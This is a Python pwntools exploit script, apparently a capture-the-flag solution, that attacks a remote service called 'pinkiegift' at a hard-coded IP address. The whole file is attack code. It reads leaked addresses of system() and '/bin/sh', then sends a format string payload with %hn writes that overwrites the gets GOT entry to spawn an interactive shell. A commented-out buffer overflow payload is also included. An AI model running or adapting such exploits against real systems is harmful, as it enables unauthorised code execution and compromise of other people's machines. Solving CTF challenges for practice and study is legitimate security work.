#!/usr/bin/python
from pwn import *


def main():
    # p = process('./pinkiegift')
    p = remote('199.247.6.180', 10006)

    ######################################################
    # Gather leaked addresses
    ######################################################
    # Here are some gifts from Santa: 0x8049940 0xf75577e0
    p.recvuntil("Santa: ")
    addresses = p.recvline().split(' ')

    binsh_addr = int(addresses[0], 16)
    system_addr = int(addresses[1], 16)

    print ">> binsh", hex(binsh_addr)
    print ">> system", hex(system_addr)

    '''
    # Buffer overflow payload
    # Did not work
    payload = 'A' * 263
    payload += p32(system_addr)
    payload += p32(system_addr) #"BBBB"
    payload += p32(system_addr) #"BBBB"
    payload += p32(binsh_addr)
    payload += p32(binsh_addr)
    p.sendline(payload)
    '''

    ######################################################
    # Format string attack
    ######################################################
    # for some reason, printf did not work, so I try gets
    # func_got_addr = 0x80498f0  # printf@plt
    func_got_addr = 0x80498f4  # gets@plt
    func_got_lower = p32(func_got_addr)
    func_got_upper = p32(func_got_addr + 0x02)

    # form payload with the param of system('/bin/sh;')
    payload = '/bin/sh;'
    payload += func_got_lower + func_got_upper

    # find offset of the address at 3 and 4.
    # payload += '-%03$p-%04$p'
    # p.sendline(payload)

    # get 16 bits of system() address
    system_addr_lower = (system_addr & 0xFFFF)
    system_addr_upper = (system_addr >> 16) & 0xFFFF
    assert (system_addr_upper > system_addr_lower)

    # how much to write to reach size of `system_addr_lower` and `system_addr_upper`
    size_write_lower = system_addr_lower - len(payload)
    size_write_upper = system_addr_upper - system_addr_lower
    print ">> len(payload)", str(len(payload))
    print ">> write lower", str(size_write_lower)
    print ">> write upper", str(size_write_upper)

    # Write to lower
    payload += '%' + str(size_write_lower) + 'x'
    payload += '%03$hn'

    # Write to upper
    payload += '%' + str(size_write_upper) + 'x'
    payload += '%04$hn'

    # send payload
    p.sendline(payload)
    p.interactive()

    ######################################################
    # Print core details
    ######################################################
    core = p.corefile
    print 'EIP', hex(core.eip)


if __name__ == "__main__":
    main()
